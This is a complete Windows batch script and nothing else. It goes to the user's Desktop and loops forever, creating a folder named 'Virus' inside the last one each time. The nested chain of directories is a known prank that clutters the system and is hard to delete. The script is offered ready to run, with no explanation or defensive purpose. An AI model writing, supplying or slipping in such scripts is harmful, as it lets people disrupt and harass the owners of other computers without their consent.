@echo off

C:
cd C:\Users\%username%\Desktop

:loop
md Virus
cd Virus
goto loop

pause>nul
exit